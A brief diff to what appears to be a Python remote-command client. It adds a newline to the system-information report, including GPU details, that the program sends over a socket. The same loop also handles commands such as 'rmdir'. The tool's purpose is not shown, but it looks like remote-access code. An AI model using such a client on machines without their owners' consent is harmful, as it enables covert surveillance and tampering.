@@ -80,6 +80,7 @@ while is_running:
                 for gpu in GPU_list:
                     for key, value in gpu.items():
                         sysinfo += f'\t\t{key}: {value}\n'
+                    sysinfo += '\n'
                         
             sock.send(sysinfo.encode())
         elif cmd.split(' ')[0] == 'rmdir':
